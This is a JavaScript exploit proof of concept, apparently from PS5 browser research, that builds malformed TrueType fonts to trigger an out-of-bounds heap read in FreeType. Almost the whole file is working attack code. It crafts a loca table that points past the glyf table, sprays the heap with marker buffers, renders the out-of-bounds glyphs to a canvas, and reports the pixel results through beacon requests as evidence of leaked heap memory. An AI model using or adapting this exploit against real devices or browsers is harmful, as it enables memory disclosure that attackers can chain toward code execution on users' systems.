// p211 — FreeType OOB read via crafted loca table
//
// CONFIRMED: V180A-T5 shows PS5 FreeType loads+renders fonts with
// loca entries pointing past glyf table. This reads adjacent heap memory.
// Goal: leak heap data by rendering glyphs whose contours come from OOB memory.
//
// Font pipeline: JS ArrayBuffer → FontFace → SharedBuffer → FT_New_Memory_Face
// Zero sanitization between JS and FreeType.
//
// Beacon prefix: V211-

(function() {
  function B(tag, body) {
    try {
      var url = '/beacon/V211-' + tag + '?t=' + Date.now();
      if (body) navigator.sendBeacon(url, body);
      else new Image().src = url;
    } catch(e) {}
  }

  function hex16(v) { return ('0000' + (v & 0xFFFF).toString(16)).slice(-4); }
  function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

  B('BOOT');

  // ---- TrueType font builder ----
  function buildTTF(opts) {
    // opts: { numGlyphs, locaOffsets[], glyfSize, oobBytes }
    var tables = {};
    var tableOrder = ['head', 'hhea', 'maxp', 'OS/2', 'name', 'cmap', 'loca', 'glyf', 'post'];

    // head table (54 bytes)
    var head = new ArrayBuffer(54);
    var hv = new DataView(head);
    hv.setUint32(0, 0x00010000); // version 1.0
    hv.setUint32(4, 0x00005000); // fontRevision
    hv.setUint32(8, 0x5F0F3CF5); // checksumAdjust placeholder
    hv.setUint32(12, 0x5F0F3CF5); // magicNumber
    hv.setUint16(16, 0x000B);     // flags
    hv.setUint16(18, 1000);       // unitsPerEm
    // created/modified timestamps (8 bytes each) — zero
    hv.setInt16(36, 0);   // xMin
    hv.setInt16(38, 0);   // yMin
    hv.setInt16(40, 1000); // xMax
    hv.setInt16(42, 1000); // yMax
    hv.setUint16(44, 0);  // macStyle
    hv.setUint16(46, 8);  // lowestRecPPEM
    hv.setInt16(48, 2);   // fontDirectionHint
    hv.setInt16(50, opts.locaFormat || 0); // indexToLocFormat: 0=short, 1=long
    hv.setInt16(52, 0);   // glyphDataFormat
    tables['head'] = head;

    // hhea table (36 bytes)
    var hhea = new ArrayBuffer(36);
    var hh = new DataView(hhea);
    hh.setUint32(0, 0x00010000); // version
    hh.setInt16(4, 800);   // ascender
    hh.setInt16(6, -200);  // descender
    hh.setInt16(8, 0);     // lineGap
    hh.setUint16(10, 1000); // advanceWidthMax
    hh.setInt16(12, 0);    // minLeftSideBearing
    hh.setInt16(14, 0);    // minRightSideBearing
    hh.setInt16(16, 1000); // xMaxExtent
    hh.setInt16(18, 1);    // caretSlopeRise
    hh.setInt16(20, 0);    // caretSlopeRun
    // 5 reserved int16 = 0
    hh.setInt16(32, 0);    // metricDataFormat
    hh.setUint16(34, opts.numGlyphs); // numberOfHMetrics
    tables['hhea'] = hhea;

    // maxp table (32 bytes)
    var maxp = new ArrayBuffer(32);
    var mp = new DataView(maxp);
    mp.setUint32(0, 0x00010000); // version
    mp.setUint16(4, opts.numGlyphs); // numGlyphs
    mp.setUint16(6, 64);   // maxPoints
    mp.setUint16(8, 1);    // maxContours
    mp.setUint16(10, 0);   // maxCompositePoints
    mp.setUint16(12, 0);   // maxCompositeContours
    mp.setUint16(14, 1);   // maxZones
    mp.setUint16(16, 0);   // maxTwilightPoints
    mp.setUint16(18, 0);   // maxStorage
    mp.setUint16(20, 0);   // maxFunctionDefs
    mp.setUint16(22, 0);   // maxInstructionDefs
    mp.setUint16(24, 0);   // maxStackElements
    mp.setUint16(26, 0);   // maxSizeOfInstructions
    mp.setUint16(28, 0);   // maxComponentElements
    mp.setUint16(30, 0);   // maxComponentDepth
    tables['maxp'] = maxp;

    // OS/2 table (78 bytes min — version 1)
    var os2 = new ArrayBuffer(78);
    var o2 = new DataView(os2);
    o2.setUint16(0, 1);     // version
    o2.setInt16(2, 500);    // xAvgCharWidth
    o2.setUint16(4, 400);   // usWeightClass
    o2.setUint16(6, 5);     // usWidthClass
    o2.setUint16(8, 0);     // fsType
    // subscript/superscript sizes — zeros
    o2.setInt16(68, 800);   // sTypoAscender
    o2.setInt16(70, -200);  // sTypoDescender
    o2.setInt16(72, 0);     // sTypoLineGap
    o2.setUint16(74, 800);  // usWinAscent
    o2.setUint16(76, 200);  // usWinDescent
    tables['OS/2'] = os2;

    // name table (minimal — just 1 entry)
    var nameStr = 'V211';
    var nameBytes = [];
    for (var i = 0; i < nameStr.length; i++) {
      nameBytes.push(0, nameStr.charCodeAt(i));
    }
    var nameData = new ArrayBuffer(6 + 12 + nameBytes.length);
    var nd = new DataView(nameData);
    nd.setUint16(0, 0);     // format
    nd.setUint16(2, 1);     // count
    nd.setUint16(4, 6 + 12); // stringOffset
    // Record 0: platform=3 (Windows), encoding=1, language=0x0409, nameID=4 (full name)
    nd.setUint16(6, 3);
    nd.setUint16(8, 1);
    nd.setUint16(10, 0x0409);
    nd.setUint16(12, 4); // nameID = full name
    nd.setUint16(14, nameBytes.length);
    nd.setUint16(16, 0); // offset in string storage
    var nameArr = new Uint8Array(nameData);
    for (var i = 0; i < nameBytes.length; i++) {
      nameArr[18 + i] = nameBytes[i];
    }
    tables['name'] = nameData;

    // cmap table — format 4 mapping glyph 0 to U+0041 ('A')
    // Simple: map 'A' (0x41) to glyph 1
    var cmapSize = 4 + 8 + 14 + 8; // header + encoding + format4
    var cmap = new ArrayBuffer(cmapSize);
    var cm = new DataView(cmap);
    cm.setUint16(0, 0);     // version
    cm.setUint16(2, 1);     // numTables
    // Encoding record: platform=3, encoding=1, offset=12
    cm.setUint16(4, 3);
    cm.setUint16(6, 1);
    cm.setUint32(8, 12);
    // Format 4 subtable at offset 12
    var fmt4Off = 12;
    cm.setUint16(fmt4Off, 4);      // format
    cm.setUint16(fmt4Off+2, 22);   // length
    cm.setUint16(fmt4Off+4, 0);    // language
    cm.setUint16(fmt4Off+6, 4);    // segCountX2 (2 segments)
    cm.setUint16(fmt4Off+8, 2);    // searchRange
    cm.setUint16(fmt4Off+10, 1);   // entrySelector
    cm.setUint16(fmt4Off+12, 0);   // rangeShift
    // endCode: 0x0041, 0xFFFF
    cm.setUint16(fmt4Off+14, 0x41);
    cm.setUint16(fmt4Off+16, 0xFFFF);
    cm.setUint16(fmt4Off+18, 0);   // reservedPad
    // startCode: 0x0041, 0xFFFF
    cm.setUint16(fmt4Off+20, 0x41);
    // Actually format 4 is more complex. Let me use format 0 instead.
    // Scrap — use format 6 (trimmed table mapping) which is simpler
    tables['cmap'] = null; // will rebuild below

    // Simpler cmap: format 6 (trimmed mapping)
    var cmap6Size = 4 + 8 + 10 + opts.numGlyphs * 2;
    var cmap6 = new ArrayBuffer(cmap6Size);
    var c6 = new DataView(cmap6);
    c6.setUint16(0, 0);     // version
    c6.setUint16(2, 1);     // numTables
    c6.setUint16(4, 1);     // platformID (Mac)
    c6.setUint16(6, 0);     // encodingID
    c6.setUint32(8, 12);    // offset
    // Format 6 subtable
    var f6 = 12;
    c6.setUint16(f6, 6);                         // format
    c6.setUint16(f6+2, 10 + opts.numGlyphs * 2); // length
    c6.setUint16(f6+4, 0);                        // language
    c6.setUint16(f6+6, 0x41);                     // firstCode = 'A'
    c6.setUint16(f6+8, opts.numGlyphs);           // entryCount
    for (var g = 0; g < opts.numGlyphs; g++) {
      c6.setUint16(f6 + 10 + g * 2, g);          // glyphIdArray
    }
    tables['cmap'] = cmap6;

    // hmtx table (4 bytes per metric)
    var hmtx = new ArrayBuffer(opts.numGlyphs * 4);
    var hm = new DataView(hmtx);
    for (var g = 0; g < opts.numGlyphs; g++) {
      hm.setUint16(g * 4, 500);  // advanceWidth
      hm.setInt16(g * 4 + 2, 0); // lsb
    }
    tables['hmtx'] = hmtx;
    tableOrder.push('hmtx');

    // loca table — THIS IS THE KEY
    // Format 0 (short): each entry is uint16, offset/2
    // Format 1 (long): each entry is uint32, actual offset
    var locaFormat = opts.locaFormat || 0;
    var locaEntries = opts.numGlyphs + 1;
    var locaSize = locaFormat === 0 ? locaEntries * 2 : locaEntries * 4;
    var loca = new ArrayBuffer(locaSize);
    var lv = new DataView(loca);
    for (var i = 0; i < locaEntries; i++) {
      var off = opts.locaOffsets ? opts.locaOffsets[i] || 0 : 0;
      if (locaFormat === 0) {
        lv.setUint16(i * 2, (off / 2) & 0xFFFF);
      } else {
        lv.setUint32(i * 4, off);
      }
    }
    tables['loca'] = loca;

    // glyf table — small, with controlled size
    var glyfSize = opts.glyfSize || 20;
    var glyf = new ArrayBuffer(glyfSize);
    var gv = new DataView(glyf);
    // Glyph 0 (.notdef): simple glyph with 1 contour, 4 points (square)
    gv.setInt16(0, 1);    // numberOfContours
    gv.setInt16(2, 0);    // xMin
    gv.setInt16(4, 0);    // yMin
    gv.setInt16(6, 500);  // xMax
    gv.setInt16(8, 500);  // yMax
    gv.setUint16(10, 3);  // endPtsOfContours[0] = 3 (4 points)
    gv.setUint16(12, 0);  // instructionLength
    // flags: 4 points, all on-curve, x/y are uint8
    if (glyfSize > 14) gv.setUint8(14, 0x37); // flag: onCurve + xShort + yShort + xSame + ySame
    if (glyfSize > 15) gv.setUint8(15, 0x37);
    if (glyfSize > 16) gv.setUint8(16, 0x37);
    if (glyfSize > 17) gv.setUint8(17, 0x37);
    // x coords (uint8 since xShort flag set)
    if (glyfSize > 18) gv.setUint8(18, 0);
    if (glyfSize > 19) gv.setUint8(19, 250);
    tables['glyf'] = glyf;

    // post table (32 bytes — format 3.0, no glyph names)
    var post = new ArrayBuffer(32);
    var pv = new DataView(post);
    pv.setUint32(0, 0x00030000); // format 3.0
    pv.setUint32(4, 0x00010000); // italicAngle
    pv.setInt16(8, -100);  // underlinePosition
    pv.setInt16(10, 50);   // underlineThickness
    pv.setUint32(12, 0);   // isFixedPitch
    tables['post'] = post;

    // ---- Assemble font file ----
    var validTables = tableOrder.filter(function(t) { return tables[t]; });
    var numTables = validTables.length;
    var headerSize = 12 + numTables * 16; // sfnt header + directory

    // Calculate table offsets
    var offset = headerSize;
    var tableOffsets = {};
    for (var i = 0; i < validTables.length; i++) {
      tableOffsets[validTables[i]] = offset;
      var tlen = tables[validTables[i]].byteLength;
      offset += (tlen + 3) & ~3; // pad to 4 bytes
    }

    var totalSize = offset + (opts.oobBytes || 0);
    var font = new ArrayBuffer(totalSize);
    var fv = new DataView(font);
    var fu = new Uint8Array(font);

    // sfnt header
    fv.setUint32(0, 0x00010000); // sfVersion (TrueType)
    fv.setUint16(4, numTables);
    // searchRange, entrySelector, rangeShift
    var sr = 1;
    while (sr * 2 <= numTables) sr *= 2;
    fv.setUint16(6, sr * 16);
    var es = 0; var tmp = sr; while (tmp > 1) { es++; tmp >>= 1; }
    fv.setUint16(8, es);
    fv.setUint16(10, numTables * 16 - sr * 16);

    // Table directory
    for (var i = 0; i < validTables.length; i++) {
      var tag = validTables[i];
      var doff = 12 + i * 16;
      // Write tag as 4 ASCII bytes (padded with spaces)
      var tagPad = (tag + '    ').substring(0, 4);
      for (var j = 0; j < 4; j++) fv.setUint8(doff + j, tagPad.charCodeAt(j));
      fv.setUint32(doff + 4, 0); // checksum (skip)
      fv.setUint32(doff + 8, tableOffsets[tag]);
      fv.setUint32(doff + 12, tables[tag].byteLength);
    }

    // Write table data
    for (var i = 0; i < validTables.length; i++) {
      var tag = validTables[i];
      fu.set(new Uint8Array(tables[tag]), tableOffsets[tag]);
    }

    return { buffer: font, glyfOffset: tableOffsets['glyf'], glyfSize: tables['glyf'].byteLength };
  }

  // ---- TEST 1: Build valid minimal font and verify it loads ----
  try {
    var validFont = buildTTF({
      numGlyphs: 2,
      glyfSize: 20,
      locaOffsets: [0, 0, 20], // glyph 0 at 0, glyph 1 at 0, end at 20
      locaFormat: 1
    });
    B('T1-BUILT-' + validFont.buffer.byteLength);

    var blob = new Blob([validFont.buffer], {type: 'font/sfnt'});
    var url = URL.createObjectURL(blob);
    var ff = new FontFace('V211Valid', 'url(' + url + ')');
    ff.load().then(function() {
      B('T1-LOADED');
      document.fonts.add(ff);

      var c = document.createElement('canvas');
      c.width = 200; c.height = 50;
      var ctx = c.getContext('2d');
      ctx.font = '40px V211Valid';
      ctx.fillText('A', 10, 40);
      var px = ctx.getImageData(0, 0, 200, 50).data;
      var nonzero = 0;
      for (var i = 0; i < px.length; i += 4) {
        if (px[i+3] > 0) nonzero++;
      }
      B('T1-PIXELS-' + nonzero);
    }).catch(function(e) {
      B('T1-ERR-' + e.message.substring(0, 50));
    });
  } catch(e) {
    B('T1-BUILD-ERR-' + e.message.substring(0, 50));
  }

  // ---- TEST 2: Font with OOB loca offset (glyph 1 points past glyf) ----
  setTimeout(function() {
    try {
      var GLYF_SIZE = 24; // small glyf table
      var OOB_OFFSETS = [256, 1024, 4096]; // bytes past glyf end

      for (var t = 0; t < OOB_OFFSETS.length; t++) {
        (function(oobOff, testIdx) {
          var oobFont = buildTTF({
            numGlyphs: 2,
            glyfSize: GLYF_SIZE,
            locaOffsets: [0, GLYF_SIZE + oobOff, GLYF_SIZE + oobOff + 100],
            locaFormat: 1,
            oobBytes: oobOff + 200 // extra bytes in buffer so ArrayBuffer doesn't bounds-check
          });
          B('T2-' + testIdx + '-BUILT-oob' + oobOff + '-sz' + oobFont.buffer.byteLength);

          var blob = new Blob([oobFont.buffer], {type: 'font/sfnt'});
          var url = URL.createObjectURL(blob);
          var name = 'V211OOB' + testIdx;
          var ff = new FontFace(name, 'url(' + url + ')');
          ff.load().then(function() {
            B('T2-' + testIdx + '-LOADED');
            document.fonts.add(ff);

            var c = document.createElement('canvas');
            c.width = 200; c.height = 50;
            var ctx = c.getContext('2d');
            ctx.font = '40px ' + name;
            ctx.fillText('A', 10, 40);
            var px = ctx.getImageData(0, 0, 200, 50).data;
            var nonzero = 0;
            for (var i = 0; i < px.length; i += 4) {
              if (px[i+3] > 0) nonzero++;
            }
            B('T2-' + testIdx + '-PIXELS-' + nonzero);
          }).catch(function(e) {
            B('T2-' + testIdx + '-ERR-' + e.message.substring(0, 50));
          });
        })(OOB_OFFSETS[t], t);
      }
    } catch(e) {
      B('T2-ERR-' + e.message.substring(0, 50));
    }
  }, 2000);

  // ---- TEST 3: OOB read with heap data extraction ----
  // Place controlled data AFTER the font in the ArrayBuffer,
  // then make loca point into that region. FreeType reads our data as glyph contours.
  setTimeout(function() {
    try {
      B('T3-START');
      var GLYF_SIZE = 24;
      // Build font where glyf is at the START, and loca points to data AFTER glyf
      // but WITHIN the ArrayBuffer. This tests if FreeType reads the OOB region.

      var fontData = buildTTF({
        numGlyphs: 2,
        glyfSize: GLYF_SIZE,
        locaOffsets: [0, GLYF_SIZE, GLYF_SIZE + 100], // glyph 1 at glyfSize (past glyf end but still in file)
        locaFormat: 1,
        oobBytes: 2048 // 2KB of extra space in the font file after tables
      });

      // Fill the OOB region with a known pattern so we can detect if it's read
      var u8 = new Uint8Array(fontData.buffer);
      var oobStart = fontData.glyfOffset + GLYF_SIZE;
      // Write a simple glyph at the OOB location
      // Simple glyph header: numberOfContours(2) xMin(2) yMin(2) xMax(2) yMax(2)
      var dv = new DataView(fontData.buffer);
      if (oobStart + 30 < fontData.buffer.byteLength) {
        dv.setInt16(oobStart, 1);    // 1 contour
        dv.setInt16(oobStart+2, 0);  // xMin
        dv.setInt16(oobStart+4, 0);  // yMin
        dv.setInt16(oobStart+6, 500); // xMax
        dv.setInt16(oobStart+8, 700); // yMax (distinctive)
        dv.setUint16(oobStart+10, 3); // endPtsOfContours[0] = 3
        dv.setUint16(oobStart+12, 0); // instructionLength
        // flags for 4 points: onCurve, xByte positive, yByte positive
        dv.setUint8(oobStart+14, 0x13); // onCurve + xShortPositive
        dv.setUint8(oobStart+15, 0x13);
        dv.setUint8(oobStart+16, 0x33); // onCurve + xShortPositive + yShortPositive
        dv.setUint8(oobStart+17, 0x33);
        // x coordinates
        dv.setUint8(oobStart+18, 0);
        dv.setUint8(oobStart+19, 200);
        dv.setUint8(oobStart+20, 200);
        dv.setUint8(oobStart+21, 0);
        // y coordinates
        dv.setUint8(oobStart+22, 0);
        dv.setUint8(oobStart+23, 0);
        dv.setUint8(oobStart+24, 150);
        dv.setUint8(oobStart+25, 150);
        B('T3-OOB-GLYPH-AT-' + oobStart);
      }

      var blob = new Blob([fontData.buffer], {type: 'font/sfnt'});
      var url = URL.createObjectURL(blob);
      var ff = new FontFace('V211Leak', 'url(' + url + ')');
      ff.load().then(function() {
        B('T3-LOADED');
        document.fonts.add(ff);

        // Render glyph that comes from OOB region
        var c = document.createElement('canvas');
        c.width = 300; c.height = 100;
        var ctx = c.getContext('2d');
        ctx.fillStyle = '#000';
        ctx.font = '80px V211Leak';
        ctx.fillText('B', 10, 80); // 'B' maps to glyph 1 (OOB)

        var imgData = ctx.getImageData(0, 0, 300, 100);
        var px = imgData.data;

        // Count non-transparent pixels and find bounding box
        var nonzero = 0;
        var minX = 300, maxX = 0, minY = 100, maxY = 0;
        for (var y = 0; y < 100; y++) {
          for (var x = 0; x < 300; x++) {
            var idx = (y * 300 + x) * 4;
            if (px[idx+3] > 0) {
              nonzero++;
              if (x < minX) minX = x;
              if (x > maxX) maxX = x;
              if (y < minY) minY = y;
              if (y > maxY) maxY = y;
            }
          }
        }
        B('T3-PIXELS-' + nonzero + '-bbox' + minX + ',' + minY + ',' + maxX + ',' + maxY);

        if (nonzero > 10) {
          B('T3-OOB-RENDERED');
          // Extract first row of pixel data as hex
          var rowHex = '';
          for (var x = minX; x <= Math.min(maxX, minX + 40); x++) {
            var idx = (minY * 300 + x) * 4;
            rowHex += ('0' + px[idx+3].toString(16)).slice(-2);
          }
          B('T3-ROW', rowHex);
        }
      }).catch(function(e) {
        B('T3-ERR-' + e.message.substring(0, 50));
      });
    } catch(e) {
      B('T3-BUILD-ERR-' + e.message.substring(0, 50));
    }
  }, 5000);

  // ---- TEST 4: True heap leak — minimal font where loca points OUTSIDE the ArrayBuffer ----
  // The font's ArrayBuffer ends right after glyf, but loca says glyph 1 is further
  // FreeType gets the buffer via FT_New_Memory_Face(library, data, size, ...)
  // If FreeType doesn't bounds-check against `size`, it reads adjacent heap memory
  setTimeout(function() {
    try {
      B('T4-START');
      var GLYF_SIZE = 24;

      // Build font with EXACT size — no padding after glyf
      var tightFont = buildTTF({
        numGlyphs: 3,
        glyfSize: GLYF_SIZE,
        locaOffsets: [0, 0, GLYF_SIZE + 256, GLYF_SIZE + 512], // glyph 2 OOB
        locaFormat: 1,
        oobBytes: 0 // NO extra buffer — OOB goes to heap
      });

      B('T4-BUILT-sz' + tightFont.buffer.byteLength + '-glyfAt' + tightFont.glyfOffset);

      // To increase chance of adjacent heap data, spray before loading
      var heapSpray = [];
      for (var s = 0; s < 1000; s++) {
        var ab = new ArrayBuffer(512);
        var v = new Uint32Array(ab);
        v[0] = 0xDEAD0000 | (s & 0xFFFF);
        v[1] = 0xBEEF0001;
        v[2] = 0xCAFE0002;
        for (var j = 3; j < v.length; j++) v[j] = 0x41410000 | j;
        heapSpray.push(ab);
      }
      B('T4-HEAPSPRAY-' + heapSpray.length);

      var blob = new Blob([tightFont.buffer], {type: 'font/sfnt'});
      var url = URL.createObjectURL(blob);
      var ff = new FontFace('V211Heap', 'url(' + url + ')');
      ff.load().then(function() {
        B('T4-LOADED');
        document.fonts.add(ff);

        var c = document.createElement('canvas');
        c.width = 300; c.height = 100;
        var ctx = c.getContext('2d');
        ctx.font = '60px V211Heap';
        ctx.fillText('C', 10, 70); // 'C' = glyph 2 (OOB into heap)

        var px = ctx.getImageData(0, 0, 300, 100).data;
        var nonzero = 0;
        for (var i = 0; i < px.length; i += 4) {
          if (px[i+3] > 0) nonzero++;
        }
        B('T4-PIXELS-' + nonzero);

        if (nonzero > 10) {
          B('T4-HEAP-LEAK-RENDERED');
        } else if (nonzero === 0) {
          B('T4-NO-RENDER');
        }
      }).catch(function(e) {
        B('T4-ERR-' + e.message.substring(0, 50));
      });
    } catch(e) {
      B('T4-BUILD-ERR-' + e.message.substring(0, 50));
    }

    setTimeout(function() { B('DONE'); }, 3000);
  }, 9000);
})();
